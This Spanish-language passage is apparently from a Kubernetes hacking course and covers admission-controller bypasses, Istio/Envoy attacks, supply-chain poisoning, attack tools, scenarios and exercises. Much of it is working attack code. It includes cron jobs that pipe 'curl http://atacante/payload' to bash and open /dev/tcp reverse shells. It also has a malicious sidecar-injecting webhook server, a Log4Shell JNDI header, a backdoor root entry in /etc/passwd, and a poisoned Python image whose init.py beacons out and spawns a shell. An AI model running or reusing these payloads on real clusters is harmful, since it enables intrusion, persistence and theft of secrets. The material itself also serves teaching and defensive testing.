**Ataques a OPA Gatekeeper**:
- Constraint malicioso que consume mucha CPU (DoS)
- Bypass con `apiVersion` no esperada
- Rego injection via parameters
- Deshabilitar Gatekeeper (si tenemos acceso a Pods en `gatekeeper-system`)

```bash
# ¿Gatekeeper está instalado?
kubectl get validatingwebhookconfigurations gatekeeper-validating-webhook-configuration
kubectl get mutatingwebhookconfigurations gatekeeper-mutating-webhook-configuration
kubectl get pods -n gatekeeper-system
```

### 7.4 Kyverno

**Kyverno** es otra alternativa a OPA, pero escrita en YAML nativo (no Rego).

**Policy de ejemplo**:

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-run-as-non-root
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-run-as-non-root
    match:
      any:
      - resources:
          kinds:
          - Pod
    validate:
      message: "runAsNonRoot debe ser true"
      pattern:
        spec:
          containers:
          - securityContext:
              runAsNonRoot: true
```

**Ataques a Kyverno**:
- Policy maliciosa que dropea requests
- Bypass con labels específicos
- Manipulación de `generate` policies

```bash
# ¿Kyverno está instalado?
kubectl get pods -n kyverno
kubectl get clusterpolicies
kubectl get policies --all-namespaces
```

### 7.5 Security Context Constraints (SCC) en OpenShift

[red](../raw/r3d3s-f0nd4m3nt0s.md) Hat OpenShift usa **SCC** en lugar de PodSecurityPolicy.

**SCC predefinidos**:

| SCC | Descripción |
|---|---|
| `restricted` | Default para usuarios normales |
| `anyuid` | Puede correr como cualquier usuario |
| `hostaccess` | Acceso a hostPID, hostNetwork, hostIPC |
| `privileged` | Sin restricciones (solo admin) |

**Ver SCCs**:

```bash
oc get scc
oc describe scc restricted
oc describe scc privileged
```

### 7.6 Bypassing Admission Controllers

Técnicas para bypassear admission controllers:

**1. Namespace existente**: Si el admission controller no opera en namespaces específicos.

```yaml
# Intentar en kube-system
kubectl --namespace=kube-system run evil-pod --image=ubuntu --privileged
```

**2. Label manipulation**: Si el admission controller filtra por labels.

```yaml
# Algunos controllers solo evalúan Pods con ciertos labels
metadata:
  labels:
    security-policy: "bypass"
```

**3. Webhook timeout**:

```yaml
# Si el webhook no responde en el timeout, el cluster falla...
# Pero si timeoutSeconds es bajo y hay failurePolicy: "Ignore"
# podemos bypassear esperando que el webhook no responda
```

**4. API version downgrade**: Usar APIs viejas que el admission controller no monitorea.

```bash
# Usar API versión vieja
kubectl --api-version=v1beta1 create -f pod.yaml
```

**5. Subresource abuse**: Algunos admission controllers solo verifican `CREATE` pero no `UPDATE`.

```bash
# Crear un Pod mínimo
kubectl run init-pod --image=ubuntu -- sleep 3600
# Luego modificar el securityContext
kubectl patch pod init-pod --type='json' \
  -p='[{"op": "add", "path": "/spec/containers/0/securityContext", "value": {"privileged": true}}]'
```

---

## 8. Service Mesh Attacks

Los service meshes (Istio, Linkerd, Consul Connect) agregan capacidades de [red](../raw/r3d3s-f0nd4m3nt0s.md), seguridad y observabilidad, pero también agregan superficie de ataque.

### 8.1 Istio Sidecar Injection

Istio inyecta un sidecar (Envoy [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)) en cada [pod](../raw/k8s-d33p-d1v3.md#pods).

**Cómo detectar pods con sidecar de Istio**:

```bash
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].name}{"\n"}{end}' | grep istio-proxy

# Pods con 2+ containers donde uno se llama istio-proxy
```

**Ataques a la sidecar injection**:

1. **Injection evasion**: Usar annotation `sidecar.istio.io/inject: "false"`

```yaml
metadata:
  annotations:
    sidecar.istio.io/inject: "false"
```

2. **Abuso de la CA de Istio**: Istio tiene su propia CA para mTLS.

```bash
# Certificado de Istio (en /etc/certs/)
ls /etc/certs/
# cert-chain.pem
# key.pem
# root-cert.pem

# Extraerlos
cat /etc/certs/key.pem
cat /etc/certs/cert-chain.pem
```

3. **Sidecar hijacking**: Si podemos modificar la configuración de Istio, podemos hacer que inyecte un sidecar malicioso en otros Pods.

### 8.2 mTLS Bypass

Istio puede habilitar mTLS estricto entre servicios, pero hay formas de bypassearlo.

**Modos mTLS en Istio**:

| Mode | Descripción |
|---|---|
| `DISABLE` | Sin mTLS |
| `PERMISSIVE` | Acepta mTLS y plaintext |
| `STRICT` | Solo mTLS |

**Bypass mTLS**:

```bash
# 1. Usar PERMISSIVE mode → enviar tráfico sin TLS
curl http://servicio.default.svc.cluster.local:80

# 2. DestinationRule que overridea mTLS
kubectl apply -f - <<EOF
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: disable-mtls
spec:
  host: "*.svc.cluster.local"
  trafficPolicy:
    tls:
      mode: DISABLE
EOF
```

**3. Routing directo al Pod (bypass del sidecar)**:

```bash
# Obtener IP del Pod
kubectl get pods -o wide | grep servicio

# Conectar directo
curl http://<POD_IP>:<PORT>
```

**4. Atacar el sidecar proxy**:

```bash
# Envoy admin API en el sidecar
curl http://localhost:15000/help
curl http://localhost:15000/config_dump
curl http://localhost:15000/clusters
curl http://localhost:15000/listeners
curl http://localhost:15000/stats

# Podemos ver la configuración de ruteo completa
curl http://localhost:15000/config_dump | jq '.configs[2].dynamicRouteConfigs'
```

### 8.3 Envoy Configuration Manipulation

Envoy es el proxy que Istio usa. Tiene una API de administración.

**Endpoints de Admin de Envoy**:

| Endpoint | [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) | Función |
|---|---|---|
| `/server_info` | 15000 | Info del server |
| `/config_dump` | 15000 | Config completa |
| `/clusters` | 15000 | Estado de clusters |
| `/listeners` | 15000 | Listeners activos |
| `/stats` | 15000 | Métricas |
| `/healthcheck/fail` | 15000 | Fail health check |
| `/quitquitquit` | 15000 | Apagar Envoy |
| `/logging` | 15000 | Cambiar nivel de log |
| `/runtime` | 15000 | Runtime config |

**Ataques**:

```bash
# Cambiar nivel de log (útil para debugear/enumerar)
curl -X POST http://localhost:15000/logging?level=debug

# Hacer que Envoy falle health check
curl -X POST http://localhost:15000/healthcheck/fail

# Apagar el sidecar
curl -X POST http://localhost:15000/quitquitquit

# Ver configuración de listeners (rutas, certs, etc.)
curl -s http://localhost:15000/config_dump | jq '.configs[0].staticResources.listeners[].name'
```

**Modificar rutas dinámicamente (XDS)**:

Si tenés acceso a la API de Istio (Pilot/istiod), podés enviar configuraciones XDS maliciosas.

```bash
# Descubrir istiod
kubectl get svc -n istio-system istiod

# Las conexiones XDS son gRPC en puerto 15010 (plaintext) o 15012 (TLS)
```

### 8.4 Service Mesh Traffic Interception

El sidecar intercepta TODO el tráfico de entrada y salida del Pod.

**Mecanismo de interceptación**:

```
Tráfico entrante → Pod → iptables → Envoy (15006) → App
App → Outbound → iptables → Envoy (15001) → Destino
```

**Bypass de interceptación**:

```bash
# 1. Usar localhost (evita iptables)
curl http://127.0.0.1:<puerto-app>

# 2. Usar IP del Pod en lugar de service name
curl http://<POD_IP>:<puerto>

# 3. Deshabilitar iptables de Istio (si tenemos root)
iptables -t nat -F ISTIO_INBOUND
iptables -t nat -F ISTIO_OUTPUT

# 4. Usar un container init que borre las reglas (si tenemos NET_ADMIN)
```

### 8.5 Istio AuthZ Bypass

Istio AuthorizationPolicy permite control de acceso a nivel de aplicación.

```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: service-authz
spec:
  selector:
    matchLabels:
      app: my-service
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/default/sa/trusted-sa"]
    to:
    - operation:
        methods: ["GET"]
```

**Bypass techniques**:

```bash
# 1. Si el source principal es muy específico, usar otro namespace
curl -H "X-Forwarded-For: trusted-sa" http://servicio

# 2. JWT spoofing si Istio usa JWT auth
curl -H "Authorization: Bearer <TOKEN-MALICIOSO>" http://servicio

# 3. Si hay un `when:` con key que podemos manipular
# Por ejemplo, request.headers con valores que controlamos

# 4. Routing bypass (si AuthorizationPolicy no aplica a todos los gateways)
```

---

## 9. Supply Chain Attacks

### 9.1 Image Vulnerability Scanning

Las imágenes de contenedores pueden tener vulnerabilidades conocidas.

**Herramientas de scanning**:

```bash
# Trivy (el más popular)
trivy image nginx:latest
trivy image --severity CRITICAL,HIGH ubuntu:22.04
trivy repo https://github.com/org/repo

# Grype
grype nginx:latest

# Clair (API-based)
# Docker Scout
docker scout quickview nginx:latest

# Snyk
snyk container test nginx:latest

# Anchore
anchore-cli image add nginx:latest
anchore-cli image vuln nginx:latest all
```

**[cve](../raw/s3c-f0nd4m3nt0s.md#cve) comunes en imágenes base**:

```
Ubuntu 22.04: CVE-2023-xxxx en OpenSSL, libc, zlib
Alpine: CVE en musl, busybox, APK
Distroless: Menos CVEs pero más difíciles de debugear
```

**Lo que un atacante busca**:
- Imágenes con `latest` tag (sin versionar)
- Imágenes con CVE críticas ([rce](../raw/w3b-h4ck1ng.md#rce), LPE)
- Imágenes públicas de registries no oficiales
- Capas históricas con secretos expuestos

### 9.2 Base Image Poisoning

Envenenar una imagen base es el supply chain attack definitivo.

**Técnicas**:

```bash
# 1. Docker Hub namespace confusion
# docker pull ubuntu  → oficial
# docker pull myrepo/ubuntu → falso

# 2. Tag confusion
docker build -t alpine:latest .
# Si alguien usa esa imagen...

# 3. Dependency confusion
# Si el Dockerfile instala paquetes desde repositorios públicos
```

**Crear una imagen maliciosa**:

```dockerfile
FROM alpine:latest
RUN apk add --no-cache bash curl

# Backdoor silencioso
RUN echo '*/5 * * * * root curl http://atacante/payload | bash' > /etc/crontabs/root

# Ocultar proceso
COPY hide.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/hide.sh

CMD ["/bin/sh"]
```

**Detección de imágenes envenenadas**:

```bash
# Ver capas de la imagen
docker history --no-trunc <image>

# Buscar secretos en capas
dive <image>

# Ver diferencias con la imagen oficial
docker diff <image>
```

### 9.3 Admission Controller Bypass

Si hay admission controllers que validan imágenes, hay formas de bypassearlos.

**Técnicas**:

1. **Image tag con [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions)**: en lugar de `nginx:latest`, usar `nginx@sha256:abc...`

```yaml
spec:
  containers:
  - image: nginx@sha256:abc123def456...
```

2. **Registries no verificados**: usar un registry no monitoreado

```yaml
spec:
  containers:
  - image: my-private.registry.com/malicious:latest
```

3. **Image con initContainer sidecar**: el init [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) se valida distinto

```yaml
spec:
  initContainers:
  - name: setup
    image: malicious:latest
    command: ["/bin/sh", "-c", "curl http://atacante/backdoor"]
  containers:
  - name: app
    image: nginx:latest  # Esta pasa la validación
```

4. **Ephemeral containers**:

```bash
kubectl debug -it <pod> --image=malicious:latest
```

### 9.4 Malicious Sidecar Injection via Admission Webhook

Si tenemos acceso a crear `MutatingWebhookConfiguration`, podemos inyectar sidecars maliciosos en todos los Pods que se crean.

```yaml
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: inject-sidecar
webhooks:
- name: inject.evil.com
  clientConfig:
    url: https://atacante/webhook/inject
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
  reinvocationPolicy: Never
```

**[payload](../raw/m3t4spl01t.md#payloads) del webhook** (lo que corre en el server atacante):

```python
from flask import Flask, request, jsonify
import json

app = Flask(__name__)

@app.route('/webhook/inject', methods=['POST'])
def inject():
    review = request.json
    pod = review['request']['object']
    
    # Agregar sidecar malicioso
    pod['spec']['containers'].append({
        'name': 'stealth-sidecar',
        'image': 'malicious:latest',
        'command': ['/bin/sh', '-c', 'curl http://atacante/beacon && sleep 3600'],
        'volumeMounts': [{
            'name': 'token',
            'mountPath': '/var/run/secrets/kubernetes.io/serviceaccount',
            'readOnly': True
        }]
    })
    
    response = {
        'apiVersion': 'admission.k8s.io/v1',
        'kind': 'AdmissionReview',
        'response': {
            'uid': review['request']['uid'],
            'allowed': True,
            'patch': [],
            'patchType': 'JSONPatch'
        }
    }
    
    return jsonify(response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
```

### 9.5 Registry Spoofing y [man-in-the-middle](../raw/m1tm-m0b1l3.md)

Interceptar tráfico entre el kubelet y el registry de imágenes.

**Técnicas**:

1. **Mirror registry malicioso**:

```yaml
# Configurar un mirror en containerd
# /etc/containerd/config.toml
[plugins."io.containerd.grpc.v1.cri".registry.mirrors]
  [plugins."io.containerd.grpc.v1.cri".registry.mirrors."docker.io"]
    endpoint = ["http://atacante:5000"]
```

2. **[dns spoofing](../raw/m1tm-m0b1l3.md#dns-spoofing)**:

```bash
# Si controlamos DNS
registro.docker.io → IP del atacante
```

3. **Image pull secret theft**:

```bash
# Extraer pull secrets
kubectl get secrets -o json | jq '.items[] | select(.type == "kubernetes.io/dockercfg" or .type == "kubernetes.io/dockerconfigjson") | .data.".dockerconfigjson" | @base64d'
```

### 9.6 Image CVE Exploitation

Explotar vulnerabilidades conocidas en imágenes.

**CVE comunes en imágenes base**:

```bash
# Log4Shell (CVE-2021-44228)
# Buscar imágenes con Log4j
trivy image --severity CRITICAL --vuln-type os,library <image>

# Spring4Shell (CVE-2022-22965)
# Dirty Pipe (CVE-2022-0847) - en Linux kernel viejos
# PrintNightmare (CVE-2021-34527) - Windows containers
```

**Explotación práctica**:

```bash
# Si encontramos una imagen con Log4j:
# 1. Atacar via HTTP header
curl -H 'User-Agent: ${jndi:ldap://atacante:1389/evil}' http://victima:8080

# 2. Si tenemos exec en el container, explotar local
kubectl exec -it <pod> -- bash
# Dentro del container:
java -jar JndiExploit.jar -L 127.0.0.1:1389
```

---

## 10. Herramientas

### 10.1 kube-hunter

Kube-hunter es un escáner de seguridad para [kubernetes](../raw/k8s-d33p-d1v3.md)-d33p-d1v3.md). Corre desde adentro o afuera del [cluster](../raw/k8s-d33p-d1v3.md#cluster).

```bash
# Instalación (Python)
pip install kube-hunter

# Modo remoto (desde afuera del cluster)
kube-hunter --remote https://<API_SERVER>:6443

# Modo CIDR (escanear subred)
kube-hunter --cidr 192.168.1.0/24

# Modo local (corre dentro del cluster como Pod)
kubectl run kube-hunter \
  --image=aquasec/kube-hunter \
  --restart=Never \
  --command -- /bin/sh -c "kube-hunter --pod"

# Ver logs
kubectl logs kube-hunter

# Modo interactivo
kube-hunter --interactive

# Output en JSON
kube-hunter --remote https://<API_SERVER>:6443 --report json
```

**Lo que kube-hunter detecta**:

| Categoría | Checks |
|---|---|
| API Server | Anonymous access, version info leak |
| Kubelet | Read-only port, anonymous auth, config leak |
| etcd | Acceso sin auth |
| RBAC | Service account permissions |
| Pods | Privileged, [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities), hostPath |
| [cloud](../raw/cl0ud-h4ck1ng.md) metadata | Acceso a metadata service |
| CVEs | Vulnerabilidades conocidas |

### 10.2 kube-bench

kube-bench ejecuta los benchmarks de seguridad CIS (Center for Internet Security) para Kubernetes.

```bash
# Instalación
# Descargar release de GitHub
wget https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_linux_amd64.tar.gz
tar xzf kube-bench_linux_amd64.tar.gz

# Ejecutar (necesita acceso al nodo)
./kube-bench

# Como Job en Kubernetes
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml

# Ver resultados
kubectl logs job/kube-bench

# Ejecutar checks específicos
./kube-bench --check 1.1.1,1.1.2

# Output JSON
./kube-bench --json > results.json

# Por plataforma
./kube-bench --version gke
./kube-bench --version eks
./kube-bench --version aks
```

**CIS Controls que verifica**:

```
1.1.1 - Ensure API Server pod configuration permissions
1.2.1 - Ensure anonymous-auth is disabled
1.2.2 - Ensure basic-auth is disabled
1.2.6 - Ensure Service Account Lookup is enabled
1.2.7 - Enable Node/RBAC authorization
1.2.22 - Enable audit logging
2.1 - Ensure etcd is running with TLS
2.2 - Ensure etcd has peer TLS
3.1.1 - Ensure kubelet anonymous auth is false
4.1.1 - Ensure image vulnerability scanning
4.2.1 - Minimize privileged containers
...
```

### 10.3 kubectl-who-can

Herramienta para verificar qué sujetos pueden hacer qué en RBAC.

```bash
# Instalación
kubectl krew install who-can

# Uso
kubectl who-can get secrets
kubectl who-can create pods
kubectl who-can delete deployments
kubectl who-can get nodes -n kube-system
kubectl who-can impersonate

# Output detallado
kubectl who-can get secrets --all-namespaces

# También sirve para ver qué SA no deberían tener ciertos permisos
kubectl who-can get pods --all-namespaces | grep system:serviceaccount
```

### 10.4 Peirates

Peirates es una herramienta todo-en-uno para post-explotación en Kubernetes. Funciona como un menú interactivo.

```bash
# Correr Peirates como Pod
kubectl run peirates \
  --image=inguardians/peirates \
  --restart=Never \
  --command -- /bin/sh -c "sleep 3600"

# Conectarse
kubectl exec -it peirates -- bash
./peirates

# O correr directo
kubectl run peirates --image=inguardians/peirates -it --restart=Never -- /bin/bash
```

**Capacidades de Peirates**:

```
Menú principal:
1) Obtener Service Account Token
2) Listar Pods via API Server
3) Listar Pods via Kubelet
4) Ejecutar comando en container
5) Port forwarding
6) Escalar privilegios
7) Crear Pod persistente
8) Modificar cluster-admin role
9) Desplegar Kubelet brute force
```

**Escenarios que automatiza**:

- Escalada desde un [pod](../raw/k8s-d33p-d1v3.md#pods) con SA token
- Token hijacking
- Kubelet scanning y exec
- Service account impersonation
- RBAC abuse
- Persistent backdoor creation

### 10.5 Kubesploit

Kubesploit es un framework de post-explotación modular para Kubernetes.

```bash
# Descargar de https://github.com/cyberark/Kubesploit

# Modo server (escucha conexiones de agentes)
./Kubesploit server -l 0.0.0.0:8443

# Modo agente (corre dentro del cluster)
./Kubesploit agent -s <server>:8443 -c cert.pem -k key.pem

# Módulos disponibles (desde consola interactiva)
list modules
use service_account_enum
use kubelet_scan
use pod_escape
use secret_dump
```

### 10.6 Bottlerocket

Bottlerocket es un OS especializado de [aws](../raw/cl0ud-h4ck1ng.md#aws) para correr contenedores. No es una herramienta de ataque per se, es un OS security-hardened.

**Características de seguridad**:
- Filesystem root readonly (solo `/etc` es escribible)
- No tiene shell por defecto
- Actualizaciones atómicas (image-based)
- DM-verity para integridad
- SELinux enforcing
- No SSH por defecto (solo API)
- [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) orchestrator integrado

**Acceso para troubleshooting** (apimig):

```bash
# Habilitar SSH temporalmente (solo con API access)
apiclient set host-containers.admin.enabled=true
apiclient set host-containers.admin.source=public.ecr.aws/bottlerocket/bottlerocket-admin:latest
```

### 10.7 kubeaudit

```bash
# Instalación
go install github.com/Shopify/kubeaudit@latest

# Auditar manifiestos YAML
kubeaudit all -f deployment.yaml

# Auditar cluster completo
kubeaudit all

# Modos específicos
kubeaudit priviliged
kubeaudit hostnetwork
kubeaudit capabilities
kubeaudit automo

# Output JSON
kubeaudit all --format json
```

### 10.8 kubescape

```bash
# Instalación
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash

# Escanear cluster
kubescape scan framework nsa --verbose

# Escanear framework MITRE
kubescape scan framework mitre

# Escanear YAML específico
kubescape scan deployment.yaml

# Output
kubescape scan --format json --output results.json
```

### 10.9 kubectl-foreach

```bash
kubectl krew install foreach

# Ejecutar comando en múltiples Pods
kubectl foreach -i "*" -- echo "hola desde"

# Con filtro por label
kubectl foreach -l "app=nginx" -- cat /etc/hostname
```

### 10.10 Rakkess

Rakkess (RunAsKubernetes) muestra qué acciones puede realizar un Service Account o usuario.

```bash
kubectl krew install access-matrix

# Matriz de acceso
kubectl access-matrix --as system:serviceaccount:default:default

# Version específica de recurso
kubectl access-matrix --subresource pods/exec

# Output JSON
kubectl access-matrix --output json
```

---

## 11. Escenarios Prácticos

### 11.1 Escenario 1: Descubrimiento de API Server Expuesto

**Setup**: Un [cluster](../raw/k8s-d33p-d1v3.md#cluster)-d33p-d1v3.md#[cluster](../raw/k8s-d33p-d1v3.md#cluster)) [k8s](../raw/k8s-d33p-d1v3.md) expone su API Server en internet ([puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 6443).

**Paso 1: Descubrimiento**:

```bash
# Escanear puertos
nmap -p 6443 <target>

# Probar conexión
curl -k https://<target>:6443

# Ver versión
curl -k https://<target>:6443/version
```

**Paso 2: Probar anonymous access**:

```bash
# Intentar listar pods sin auth
curl -k https://<target>:6443/api/v1/pods

# Si da 403, probar system:anonymous con ClusterRoleBinding
curl -k https://<target>:6443/api/v1/namespaces/default/pods
```

**Paso 3: Enumeración**:

```bash
# Listar APIs disponibles
curl -k https://<target>:6443/apis/
curl -k https://<target>:6443/apis/rbac.authorization.k8s.io/v1

# Si tenemos algún acceso, listar recursos
curl -k https://<target>:6443/api/v1/namespaces
curl -k https://<target>:6443/api/v1/nodes
```

### 11.2 Escenario 2: Escalada desde un [pod](../raw/k8s-d33p-d1v3.md#pods) con Service Account

**Setup**: Tenemos ejecución en un Pod con un Service Account que tiene [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) excesivos.

**Paso 1: Verificar el token del SA**:

```bash
# Desde dentro del Pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Paso 2: Probar permisos**:

```bash
# Usar kubectl (si está instalado) o API directa
APISERVER="https://kubernetes.default.svc"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Ver qué podemos hacer
curl -sk $APISERVER/api/v1/namespaces/$NAMESPACE/secrets \
  -H "Authorization: Bearer $TOKEN"
```

**Paso 3: Escalar**:

```bash
# Si podemos crear Pods, crear un Pod privilegiado
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escalation-pod
spec:
  containers:
  - name: escape
    image: ubuntu:latest
    command: ["/bin/sh", "-c", "apt-get update && apt-get install -y curl && while true; do sleep 30; done"]
    volumeMounts:
    - name: dockersock
      mountPath: /var/run/docker.sock
  volumes:
  - name: dockersock
    hostPath:
      path: /var/run/docker.sock
EOF
```

### 11.3 Escenario 3: etcd sin Protección

**Setup**: etcd expuesto sin [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) ni autenticación.

```bash
# Conectar a etcd
etcdctl --endpoints=http://<ETCD_IP>:2379 get / --prefix --keys-only

# Extraer todos los tokens de service accounts
for key in $(etcdctl --endpoints=http://<ETCD_IP>:2379 get /registry/secrets --prefix --keys-only); do
    echo "=== $key ==="
    etcdctl --endpoints=http://<ETCD_IP>:2379 get "$key"
done

# Extraer certificado de la CA
etcdctl --endpoints=http://<ETCD_IP>:2379 get /registry/secrets/kube-system/ca --print-value-only
```

### 11.4 Escenario 4: Breakout de [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) Privilegiado

**Setup**: Un container con `privileged: true`.

**Paso 1: Verificar privilegios**:

```bash
cat /proc/1/status | grep CapEff
# Decodificar
capsh --decode=$(cat /proc/1/status | grep CapEff | awk '{print $2}')
```

**Paso 2: Breakout**:

```bash
# Montar el disco del host
mkdir /mnt-host
mount /dev/sda1 /mnt-host
chroot /mnt-host bash

# O usar nsenter
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

**Paso 3: [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)**:

```bash
# Crear usuario backdoor en el host
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Instalar SSH key
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAA...' >> /root/.ssh/authorized_keys

# Dejar un cron reverse shell
echo '* * * * * root bash -c "bash -i >& /dev/tcp/atacante/4444 0>&1"' >> /etc/crontab
```

### 11.5 Escenario 5: Envenenamiento de Supply Chain

**Setup**: Un registry privado donde podemos hacer push de imágenes.

**Paso 1: Crear imagen maliciosa**:

```dockerfile
FROM python:3.11-slim

# Instalar herramientas
RUN pip install requests

# Payload silencioso
COPY init.py /usr/local/lib/python3.11/site-packages/init.py
ENV PYTHONSTARTUP=/usr/local/lib/python3.11/site-packages/init.py
```

**init.py**:

```python
import requests
import os
import subprocess

# Beacon
requests.post('https://atacante/beacon', json={'host': os.uname().nodename})

# Reverse shell
subprocess.Popen(['bash', '-c', 'bash -i >& /dev/tcp/atacante/4444 0>&1'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
```

**Paso 2: Subir al registry**:

```bash
docker build -t malicious-python:latest .
docker tag malicious-python:latest registry.internal.com/team/python:3.11
docker push registry.internal.com/team/python:3.11
```

**Paso 3: Esperar**:

```bash
# Cuando alguien deploye una imagen basada en nuestra python:3.11
# El pod nos hará beacon y nos dará reverse shell
```

### 11.6 Escenario 6: Ataque a Service Mesh

**Setup**: Cluster con Istio habilitado.

**Paso 1: Enumerar**:

```bash
# Listar Pods con sidecar
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].name}{"\n"}{end}' | grep istio-proxy

# Obtener configuración de Envoy
kubectl exec -it <pod> -c istio-proxy -- curl http://localhost:15000/config_dump
```

**Paso 2: Deshabilitar mTLS**:

```bash
# Si tenemos permisos RBAC
kubectl apply -f - <<EOF
apiVersion: networking.istio.io/v1beta1
kind: DestinationRule
metadata:
  name: disable-mtls
spec:
  host: "*/*"
  trafficPolicy:
    tls:
      mode: DISABLE
EOF
```

**Paso 3: Sniffear tráfico**:

```bash
# Desde el sidecar (sin mTLS)
kubectl exec -it <pod> -c istio-proxy -- tcpdump -i any -w /tmp/capture.pcap

# Copiar el pcap
kubectl cp <pod>:/tmp/capture.pcap ./capture.pcap -c istio-proxy
```

---

## 12. Ejercicios Prácticos

### Ejercicio 1: Enumeración de API Server

**Objetivo**: Identificar configuraciones inseguras en un API Server.

```bash
# 1. Descubrir el API Server
nmap -p 6443,443 <ip>

# 2. Probar anonymous access
curl -k https://server:6443/api/v1

# 3. Probar diferentes endpoints sin auth
for endpoint in /api/v1/pods /api/v1/secrets /api/v1/nodes /version /healthz /openapi/v2; do
    echo "=== $endpoint ==="
    curl -sk https://server:6443$endpoint | head -c 200
    echo
done

# 4. Preguntas:
# - ¿Qué versión de Kubernetes corre?
# - ¿Hay anonymous access?
# - ¿Podés descubrir namespaces?
```

### Ejercicio 2: Service Account Token Abuse

**Setup**: Tenés un [pod](../raw/k8s-d33p-d1v3.md#pods) con SA token.

```bash
# 1. Extraer el token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER="https://kubernetes.default.svc"

# 2. Enumerar lo que podemos hacer
for resource in pods services secrets configmaps deployments; do
    echo "=== $resource ==="
    curl -sk $APISERVER/api/v1/namespaces/$NAMESPACE/$resource \
         -H "Authorization: Bearer $TOKEN" | head -c 300
    echo
done

# 3. Intentar crear un Pod
curl -sk -X POST $APISERVER/api/v1/namespaces/$NAMESPACE/pods \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"apiVersion":"v1","kind":"Pod","metadata":{"name":"test-pod"},"spec":{"containers":[{"name":"test","image":"nginx"}]}}'
```

### Ejercicio 3: Kubelet Scanning

**Objetivo**: Encontrar kubelets expuestos.

```bash
# 1. Escanear CIDR para kubelets
nmap -p 10250,10255 <CIDR>

# 2. Probar read-only port
curl http://<node>:10255/pods

# 3. Probar authenticated port con anonymous
curl -k https://<node>:10250/pods

# 4. Si tenemos token, probar exec
curl -k https://<node>:10250/exec/namespace/pod/container?command=id \
    -H "Authorization: Bearer $TOKEN"
```

### Ejercicio 4: Breakout Simulado

**Setup**: KinD o Minikube local.

```bash
# 1. Crear un Pod privilegiado
kubectl run test-priv --image=ubuntu --privileged -- sleep 3600

# 2. Conectarse
kubectl exec -it test-priv -- bash

# 3. Ver capabilities
cat /proc/1/status | grep CapEff

# 4. Intentar montar el host
fdisk -l
mkdir /mnt
mount /dev/sda1 /mnt 2>/dev/null || mount /dev/vda1 /mnt 2>/dev/null

# 5. nsenter escape (si está disponible)
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# 6. Verificar que salimos del container
cat /etc/hostname  # Debería ser el hostname del NODO, no del Pod
```

### Ejercicio 5: etcd Dump

**Setup**: KinD con etcd accesible.

```bash
# 1. Descubrir etcd en el cluster
kubectl get pods -n kube-system -l component=etcd

# 2. Obtener certificados de etcd
kubectl exec -it etcd-<node> -n kube-system -- cat /etc/kubernetes/pki/etcd/ca.crt

# 3. Usar etcdctl desde el Pod
kubectl exec -it etcd-<node> -n kube-system -- sh
ETCDCTL_API=3 etcdctl --endpoints=localhost:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only | head -50
```

### Ejercicio 6: Pod Security Assessment

```bash
# 1. Listar todos los Pods con sus securityContext
kubectl get pods --all-namespaces -o json | jq '.items[] | {
    name: .metadata.name,
    ns: .metadata.namespace,
    privileged: .spec.containers[].securityContext.privileged,
    runAsRoot: .spec.containers[].securityContext.runAsNonRoot,
    hostPID: .spec.hostPID,
    hostNetwork: .spec.hostNetwork
}'

# 2. Auditar con kube-bench
kube-bench run --targets master,node

# 3. Escanear con kubescape
kubescape scan --verbose

# 4. ¿Cuántos Pods tienen privileged: true?
# ¿Hay algún SA con cluster-admin?
# ¿Los kubelets usan anonymous auth?
```

### Ejercicio 7: RBAC Review

```bash
# 1. Listar todos los ClusterRoles y ver cuáles tienen wildcards
kubectl get clusterroles -o json | jq '.items[] | select(.rules[].apiGroups[0] == "*") | .metadata.name'

# 2. Revisar qué SA tienen permisos de admin
for SA in $(kubectl get sa --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\n"}{end}'); do
    NS=$(echo $SA | cut -f1)
    NAME=$(echo $SA | cut -f2)
